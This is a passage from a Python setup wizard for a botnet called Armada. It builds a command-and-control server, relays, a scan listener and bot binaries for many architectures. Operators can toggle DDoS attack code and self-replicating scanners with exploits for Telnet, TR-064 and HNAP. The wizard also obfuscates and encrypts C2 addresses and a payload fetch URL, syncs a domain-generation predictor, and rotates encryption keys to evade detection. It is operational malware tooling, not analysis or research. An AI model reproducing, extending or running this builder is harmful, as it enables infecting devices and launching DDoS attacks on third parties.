    success("DGA predict tool synced")

    if update_bot_debug_mode(bot_path, config["debug_mode"]):
        success(f"Debug mode: {'ON' if config['debug_mode'] else 'OFF'}")
    else:
        warning("Failed to set debug mode")

    # Update default proxy credentials
    update_proxy_credentials(
        bot_path, config.get("proxy_user", "vision"), config.get("proxy_pass", "vision")
    )
    success(f"Proxy credentials: {config.get('proxy_user', 'vision')}:{config.get('proxy_pass', 'vision')}")

    # Encrypt fetch_url and bins_host into config.c blobs
    fetch_url = config.get("fetch_url", f"http://{config.get('bins_host', '127.0.0.1')}/init.sh")
    bins_host = config.get("bins_host", config.get("server_ip", "127.0.0.1"))
    enc_fetch_url = dual_layer_encrypt(fetch_url)
    enc_bins_host = dual_layer_encrypt(bins_host)
    with open(cpp_config_path, "r") as f:
        content = f.read()
    content = re.sub(
        r'(static const char\s*\*\s*raw_fetch_url\s*=\s*")[^"]*"',
        lambda m: f'{m.group(1)}{enc_fetch_url}"',
        content,
    )
    content = re.sub(
        r'(static const char\s*\*\s*raw_bins_host\s*=\s*")[^"]*"',
        lambda m: f'{m.group(1)}{enc_bins_host}"',
        content,
    )
    with open(cpp_config_path, "w") as f:
        f.write(content)
    success(f"Bins host: {bins_host} (encrypted)")
    success(f"Fetch URL: {fetch_url} (encrypted)")

    # Step 5: Build
    print_step(4, 4, "Building Binaries")

    # Attack code toggle
    print(f"{Colors.BRIGHT_CYAN}🔧 Attack Code{Colors.RESET}")
    print(f"{Colors.DIM}   Disabling removes all DDoS functionality, reducing binary size ~10-15%.{Colors.RESET}")
    print(f"{Colors.DIM}   Everything else (SOCKS proxy, shell, persist, etc.) stays intact.{Colors.RESET}\n")
    disable_atk = confirm("Disable attack code? (proxy-only build)", default=False)
    set_attack_mode(base_path, disable_atk)
    if disable_atk:
        success("Attack code DISABLED — proxy-only build")
    else:
        success("Attack code ENABLED — full build")
    print()

    # Self-replication code toggle
    print(f"{Colors.BRIGHT_CYAN}🔧 Self-Replication (Scanners/Exploits){Colors.RESET}")
    print(f"{Colors.DIM}   Disabling removes all scanner and exploit code (Telnet, TR-064, HNAP).{Colors.RESET}")
    print(f"{Colors.DIM}   Bots will NOT scan or spread to new devices. Reduces binary size ~5-10%.{Colors.RESET}\n")
    disable_selfrep = confirm("Disable self-replication code? (no scanners)", default=False)
    set_selfrep_mode(base_path, disable_selfrep)
    if disable_selfrep:
        success("Self-replication DISABLED — no scanner/exploit code")
    else:
        success("Self-replication ENABLED — scanners included")
    print()

    if confirm("Would you like to build the CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed - build manually with: cd cnc && go build")

    if confirm("Would you like to build the admin relay?"):
        if build_admin_relay(base_path):
            success("Admin relay built")
        else:
            warning("Admin relay build failed - build manually with: cd cnc/admin_relay && go build")

    update_relay_config(base_path, config["magic_code"])
    if confirm("Would you like to build the proxy relay (SOCKS5 backconnect)?"):
        if build_relay(base_path):
            success("Proxy relay built")
        else:
            warning("Proxy relay build failed - build manually with: cd relay && go build")

    if confirm("Would you like to build the scan listener (receives scanner results)?"):
        if build_scan_listener(base_path):
            success("Scan listener built")
        else:
            warning("Scan listener build failed - build manually with: cd scanListen && go build")

    if confirm(
        "Would you like to build proxy binaries? (14 architectures, takes a few mins)"
    ):
        if build_bots(base_path):
            success("Proxy binaries built")
        else:
            warning("Proxy build had issues - check bins/")

    # Save config
    config_file = save_config(base_path, config)
    info(f"Configuration saved to: {config_file}")

    print_summary(config)


def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
    """Update server URL only - keep existing magic code and protocol"""

    # Debug Mode Configuration (before main setup)
    debug_enabled = prompt_debug_mode()

    if debug_enabled:
        warning("Debug mode ENABLED - remember to disable for production!")
    else:
        success("Debug mode disabled - ready for production")
    print()

    # Get existing config
    info("Reading existing configuration...")
    existing = get_current_config(bot_path, cnc_path)

    if not existing.get("magic_code") or not existing.get("crypt_seed"):
        error("Could not read existing configuration!")
        error("Please run Full Setup instead.")
        return

    print()
    info(
        f"Current Magic Code: {Colors.BRIGHT_WHITE}{existing.get('magic_code', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Protocol: {Colors.BRIGHT_WHITE}{existing.get('protocol_version', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}"
    )
    info(
        f"Current Admin Port: {Colors.BRIGHT_WHITE}{existing.get('admin_port', 'N/A')}{Colors.RESET}"
    )
    print()

    config = {}
    config["magic_code"] = existing["magic_code"]
    config["protocol_version"] = existing["protocol_version"]
    config["crypt_seed"] = existing["crypt_seed"]
    config["admin_port"] = existing.get("admin_port", "420")

    # Step 1: New Server Address
    print_step(1, 2, "New Server Address")

    print(
        f"{Colors.DIM}   Enter IP or domain (no http:// prefix). Supports direct IP, A record, or TXT record.{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   Examples: 192.168.1.100 | c2.example.com | lookup.mydomain.com{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   You can configure up to 5 C2 addresses. The bot rotates between them on failure.{Colors.RESET}\n"
    )

    c2_ip = prompt("What is your new server IP or domain?")
    if not c2_ip:
        error("Server address is required!")
        return

    print(
        f"\n{Colors.DIM}   Enter one or more ports the C2 should listen on (comma-separated).{Colors.RESET}"
    )
    print(
        f"{Colors.DIM}   The bot will try each port in random order until one connects.{Colors.RESET}\n"
    )
    c2_ports_str = prompt("C2 ports", "443")
    c2_ports = [p.strip() for p in c2_ports_str.split(",") if p.strip()]
    if not c2_ports:
        c2_ports = ["443"]
    config["c2_ports"] = c2_ports

    c2_addresses = [f"{c2_ip.strip()}:{','.join(c2_ports)}"]

    for i in range(4):
        extra = prompt(f"Add another C2 address? (empty to skip)", "")
        if not extra.strip():
            break
        c2_addresses.append(f"{extra.strip()}:{','.join(c2_ports)}")

    config["c2_addresses"] = c2_addresses
    config["c2_address"] = c2_addresses[0]

    if len(c2_addresses) == 1:
        success(f"New server: {c2_addresses[0]}")
    else:
        success(f"New C2 Pool: {', '.join(c2_addresses)}")

    # Step 2: Update & Build
    print_step(2, 2, "Update & Build")

    print(f"{Colors.DIM}   Applying new server address (keeping existing encryption keys)...{Colors.RESET}\n")

    # Keep existing encryption keys — only update URLs/ports
    cpp_crypto_path = os.path.join(bot_path, "crypto.c")
    cpp_config_path = os.path.join(bot_path, "config.c")
    existing_aes_key = read_current_key_cpp(cpp_crypto_path)
    existing_chacha_key = read_current_chacha_key_cpp(cpp_crypto_path)

    if not existing_aes_key or not existing_chacha_key:
        error("Could not read existing encryption keys from crypto.c!")
        error("Please run Full Setup instead.")
        return

    # Use the same keys — no rotation, no re-encryption needed
    new_aes_key = existing_aes_key
    new_chacha_key = existing_chacha_key
    success(f"AES key preserved ({existing_aes_key.hex()[:16]}...)")
    success(f"ChaCha20 key preserved ({existing_chacha_key.hex()[:16]}...)")

    # Obfuscate C2 pool (now uses the NEW keys via garuda_key() / derive_key_py())
    obfuscated_parts = []
    for addr in c2_addresses:
        obfuscated_parts.append(obfuscate_c2(addr, config["crypt_seed"]))
    obfuscated_c2 = "\x00".join(obfuscated_parts)
    config["obfuscated_c2"] = obfuscated_c2

    all_verified = True
    for i, addr in enumerate(c2_addresses):
        if not verify_obfuscation(obfuscated_parts[i], config["crypt_seed"], addr):
            all_verified = False
            error(f"Obfuscation verification failed for {addr}!")
    if all_verified:
        success(f"Server address obfuscation verified ({len(c2_addresses)} address(es)) ✓")
    else:
        error("Obfuscation verification failed!")
        sys.exit(1)

    # Update bot source with new C2 and existing tokens
    if update_bot_config(
        bot_path,
        config["magic_code"],
        config["protocol_version"],
        obfuscated_c2,
        config["crypt_seed"],
    ):
        success("Proxy agent configured")
    else:
        error("Failed to update proxy agent")

    # Update CNC bot listener ports
    if update_cnc_main_go(cnc_path, config["magic_code"], config["protocol_version"],
                          config["admin_port"], config.get("c2_ports", ["443"]),
                          proxy_user=config.get("proxy_user", "vision"),
                          proxy_pass=config.get("proxy_pass", "vision")):
        success("CNC ports configured")
    else:
        warning("Failed to update CNC ports")

    update_dga_predict(base_path, config["crypt_seed"], config["magic_code"], new_aes_key)
    success("DGA predict tool synced")

    if update_bot_debug_mode(bot_path, debug_enabled):
        success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
    else:
        warning("Failed to set debug mode")

    if confirm("Would you like to build the CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed - build manually with: cd cnc && go build")

    if confirm("Would you like to build the admin relay?"):
        if build_admin_relay(base_path):
            success("Admin relay built")
        else:
            warning("Admin relay build failed")

    update_relay_config(base_path, config["magic_code"])
    if confirm("Would you like to build the proxy relay (SOCKS5 backconnect)?"):
        if build_relay(base_path):
            success("Proxy relay built")
        else:
            warning("Proxy relay build failed - build manually with: cd relay && go build")

    if confirm("Would you like to build proxy binaries? (takes a few mins)"):
        if build_bots(base_path):
            success("Proxy binaries built")
        else:
            warning("Proxy build had issues - check bins/")

    # Summary
    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(
        f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SERVER URL UPDATE COMPLETE!{Colors.RESET}"
    )
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")

    if len(c2_addresses) == 1:
        print(
            f"  {Colors.YELLOW}New Address:{Colors.RESET}     {Colors.BRIGHT_WHITE}{c2_addresses[0]}{Colors.RESET}"
        )
    else:
        print(
            f"  {Colors.YELLOW}New C2 Pool:{Colors.RESET}    {Colors.BRIGHT_WHITE}{', '.join(c2_addresses)}{Colors.RESET}"
        )
    print(
        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}"
    )
    print()
    warning("Deploy new proxy binaries from bins/")
    warning("Existing proxies will NOT auto-update - redeploy required")
    print()


def run_rebuild(base_path: str, cnc_path: str, bot_path: str):
    """Rebuild only - toggle attack code and rebuild binaries"""

    # Show current attack mode
    currently_disabled = is_attack_disabled(base_path)
    if currently_disabled:
        info(f"Attack code is currently: {Colors.BRIGHT_RED}DISABLED{Colors.RESET} (proxy-only build)")
    else:
        info(f"Attack code is currently: {Colors.BRIGHT_GREEN}ENABLED{Colors.RESET} (full build)")
    print()

    # Ask what they want
    print(f"{Colors.BRIGHT_CYAN}🔧 Attack Code Toggle{Colors.RESET}")
    print(f"{Colors.DIM}   Disabling attack code removes all DDoS functionality from binaries.")
    print(f"   Everything else (SOCKS proxy, shell, persist, etc.) stays intact.{Colors.RESET}")
    print(f"{Colors.DIM}   This reduces binary size by ~10-15%.{Colors.RESET}\n")

    if currently_disabled:
        enable = confirm("Enable attack code?", default=False)
        if enable:
            set_attack_mode(base_path, False)
            success("Attack code ENABLED")
        else:
            info("Attack code stays disabled")
    else:
        disable = confirm("Disable attack code? (proxy-only build)", default=False)
        if disable:
            set_attack_mode(base_path, True)
            success("Attack code DISABLED — proxy-only build")
        else:
            info("Attack code stays enabled")
    print()

    # Show current selfrep mode
    selfrep_disabled = is_selfrep_disabled(base_path)
    if selfrep_disabled:
        info(f"Self-replication is currently: {Colors.BRIGHT_RED}DISABLED{Colors.RESET} (no scanners)")
    else:
        info(f"Self-replication is currently: {Colors.BRIGHT_GREEN}ENABLED{Colors.RESET} (scanners included)")
    print()

    print(f"{Colors.BRIGHT_CYAN}🔧 Self-Replication Toggle{Colors.RESET}")
    print(f"{Colors.DIM}   Disabling removes all scanner and exploit code (Telnet, TR-064, HNAP).")
    print(f"   Bots will NOT scan or spread to new devices.{Colors.RESET}")
    print(f"{Colors.DIM}   This reduces binary size by ~5-10%.{Colors.RESET}\n")

    if selfrep_disabled:
        enable_sr = confirm("Enable self-replication code?", default=False)
        if enable_sr:
            set_selfrep_mode(base_path, False)
            success("Self-replication ENABLED")
        else:
            info("Self-replication stays disabled")
    else:
        disable_sr = confirm("Disable self-replication code? (no scanners)", default=False)
        if disable_sr:
            set_selfrep_mode(base_path, True)
            success("Self-replication DISABLED — no scanner/exploit code")
        else:
            info("Self-replication stays enabled")
    print()

    # Debug mode
    debug_enabled = prompt_debug_mode()
    if update_bot_debug_mode(bot_path, debug_enabled):
        success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")
    print()

    # Build
    if confirm("Build proxy binaries now?"):
        if build_bots(base_path):
            success("Proxy binaries built")
        else:
            warning("Proxy build had issues - check bins/")

    if confirm("Build CNC server?", default=False):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed")

    if confirm("Build proxy relay?", default=False):
        if build_relay(base_path):
            success("Proxy relay built")
        else:
            warning("Relay build failed")

    print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ REBUILD COMPLETE!{Colors.RESET}")
    print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
    atk = is_attack_disabled(base_path)
    print(f"  {Colors.YELLOW}Attack Code:{Colors.RESET}     {Colors.BRIGHT_WHITE}{'DISABLED (proxy-only)' if atk else 'ENABLED (full)'}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Debug Mode:{Colors.RESET}      {Colors.BRIGHT_WHITE}{'ON' if debug_enabled else 'OFF'}{Colors.RESET}")
    print()


def run_import_config(base_path: str, cnc_path: str, bot_path: str):
    """Import configuration from setup_config.txt and rebuild"""

    config_path = os.path.join(base_path, "setup_config.txt")
    if not os.path.exists(config_path):
        error(f"setup_config.txt not found at {config_path}")
        error("Nothing to import. Run Full Setup instead.")
        return

    info(f"Reading {config_path}...")
    config = load_config_file(base_path)

    if not config:
        error("Could not parse setup_config.txt!")
        return

    # Validate required fields
    required = ["magic_code", "crypt_seed", "c2_addresses"]
    missing = [k for k in required if not config.get(k)]
    if missing:
        error(f"Missing required fields in config: {', '.join(missing)}")
        return

    # Show what we found
    print()
    print(f"{Colors.BRIGHT_CYAN}Imported Configuration:{Colors.RESET}")
    print(f"  {Colors.YELLOW}C2 Address:{Colors.RESET}      {Colors.BRIGHT_WHITE}{', '.join(config.get('c2_addresses', []))}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Admin Port:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('admin_port', 'N/A')}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Bot Ports:{Colors.RESET}       {Colors.BRIGHT_WHITE}{', '.join(config.get('c2_ports', ['443']))}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('magic_code', 'N/A')}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Protocol:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config.get('protocol_version', 'N/A')}{Colors.RESET}")
    print(f"  {Colors.YELLOW}Crypt Seed:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config.get('crypt_seed', 'N/A')}{Colors.RESET}")
    if config.get("proxy_user"):
        print(f"  {Colors.YELLOW}Proxy Auth:{Colors.RESET}      {Colors.BRIGHT_WHITE}{config['proxy_user']}:{config.get('proxy_pass', '')}{Colors.RESET}")
    if config.get("obfuscated_c2"):
        print(f"  {Colors.YELLOW}Obfuscated C2:{Colors.RESET}   {Colors.BRIGHT_WHITE}{config['obfuscated_c2'][:40]}...{Colors.RESET}")
    print()

    # Compare with current source
    existing = get_current_config(bot_path, cnc_path)
    diffs = []
    for key, label in [("magic_code", "Magic Code"), ("protocol_version", "Protocol"),
                        ("crypt_seed", "Crypt Seed"), ("admin_port", "Admin Port")]:
        old = existing.get(key, "")
        new = config.get(key, "")
        if old and new and old != new:
            diffs.append(f"  {label}: {Colors.RED}{old}{Colors.RESET} -> {Colors.GREEN}{new}{Colors.RESET}")
    if diffs:
        warning("Differences detected between source and config file:")
        for d in diffs:
            print(d)
        print()
    else:
        success("Config file matches current source")
        print()

    if not confirm("Apply this configuration and rebuild?"):
        info("Cancelled.")
        return

    # Debug mode
    debug_enabled = prompt_debug_mode()
    print()

    # Re-encrypt keys for the new config
    info("Generating new encryption keys...")
    cpp_crypto_path = os.path.join(bot_path, "crypto.c")
    cpp_config_path = os.path.join(bot_path, "config.c")
    old_aes_key = read_current_key_cpp(cpp_crypto_path)
    old_chacha_key = read_current_chacha_key_cpp(cpp_crypto_path)
    new_aes_key, _ = generate_random_key()
    new_chacha_key, _ = generate_random_key()
    patch_cpp_keys(cpp_crypto_path, new_aes_key, new_chacha_key)
    success(f"AES key randomized ({new_aes_key.hex()[:16]}...)")
    success(f"ChaCha20 key randomized ({new_chacha_key.hex()[:16]}...)")

    # Re-obfuscate C2 address
    c2_raw_list = config.get("c2_addresses", [])
    c2_combined = "\x00".join(c2_raw_list)
    obfuscated_c2 = obfuscate_c2(c2_combined, config["crypt_seed"])
    config["obfuscated_c2"] = obfuscated_c2

    # Verify obfuscation
    all_verified = True
    obfuscated_parts = [obfuscate_c2(addr, config["crypt_seed"]) for addr in c2_raw_list]
    for i, addr in enumerate(c2_raw_list):
        if not verify_obfuscation(obfuscated_parts[i], config["crypt_seed"], addr):
            all_verified = False
            error(f"Obfuscation verification failed for {addr}!")
    if all_verified:
        success(f"C2 address obfuscation verified ({len(c2_raw_list)} address(es))")
    else:
        error("Obfuscation verification failed!")
        return

    # Apply to source files
    info("Applying configuration to source files...")

    # Re-encrypt config blobs FIRST (while raw_service_addrs still has old-key ciphertext),
    # then overwrite raw_service_addrs with fresh encryption using new keys.
    # This matches the order in run_full_setup().
    encrypt_cpp_config_blobs(cpp_config_path, old_aes_key, new_aes_key,
                             old_chacha_key, new_chacha_key)
    success("Config table re-encrypted")

    if update_bot_config(
        bot_path, config["magic_code"], config["protocol_version"],
        obfuscated_c2, config["crypt_seed"]
    ):
        success("Bot config updated")
    else:
        error("Failed to update bot config")
        return

    if update_cnc_main_go(cnc_path, config["magic_code"], config["protocol_version"],
                          config.get("admin_port", "441"), config.get("c2_ports", ["443"]),
                          proxy_user=config.get("proxy_user"),
                          proxy_pass=config.get("proxy_pass")):
        success("CNC config updated")
    else:
        error("Failed to update CNC config")

    # Proxy credentials
    if config.get("proxy_user"):
        update_proxy_credentials(
            bot_path, config["proxy_user"], config.get("proxy_pass", "")
        )
        success(f"Proxy credentials: {config['proxy_user']}:{config.get('proxy_pass', '')}")

    # Debug mode
    if update_bot_debug_mode(bot_path, debug_enabled):
        success(f"Debug mode: {'ON' if debug_enabled else 'OFF'}")

    # DGA predict
    update_dga_predict(base_path, config["crypt_seed"], config["magic_code"], new_aes_key)
    success("DGA predict tool synced")

    print()

    # Build
    if confirm("Build proxy binaries now?"):
        if build_bots(base_path):
            success("Proxy binaries built")
        else:
            warning("Proxy build had issues - check bins/")

    if confirm("Build CNC server?"):
        if build_cnc(cnc_path):
            success("CNC server built")
        else:
            warning("CNC build failed")

    if confirm("Build proxy relay?", default=False):
        if build_relay(base_path):
            success("Proxy relay built")
        else:
            warning("Relay build failed")

    # Save updated config
    save_config(base_path, config)

    print_summary(config)


def main():
    """Main setup wizard"""
    print_banner()

    # Get base path
    base_path = os.path.dirname(os.path.abspath(__file__))
    cnc_path = os.path.join(base_path, "cnc")
    bot_path = os.path.join(base_path, "bot")

    # Verify paths exist
    if not os.path.exists(cnc_path) or not os.path.exists(bot_path):
        error("Cannot find cnc/ or bot/ directories. Run this from Armada root.")
        sys.exit(1)

    print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}")

    # Show current attack mode status
    if is_attack_disabled(base_path):
        print(f"{Colors.DIM}Attack code: {Colors.BRIGHT_RED}DISABLED{Colors.DIM} (proxy-only){Colors.RESET}")
    else:
        print(f"{Colors.DIM}Attack code: {Colors.BRIGHT_GREEN}ENABLED{Colors.RESET}")

    # Show menu
    choice = print_menu()

    if choice == "1":
        info("Starting Full Setup...")
        run_full_setup(base_path, cnc_path, bot_path)
    elif choice == "2":
        info("Starting Server URL Update...")
        run_c2_update(base_path, cnc_path, bot_path)
    elif choice == "3":
        info("Starting Rebuild...")
        run_rebuild(base_path, cnc_path, bot_path)
    elif choice == "4":
        info("Importing from setup_config.txt...")
        run_import_config(base_path, cnc_path, bot_path)
    elif choice == "0":
        print("\nExiting.")
        sys.exit(0)
    else:
        error("Invalid option")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Setup cancelled by user.{Colors.RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}Error: {e}{Colors.RESET}")
        sys.exit(1)
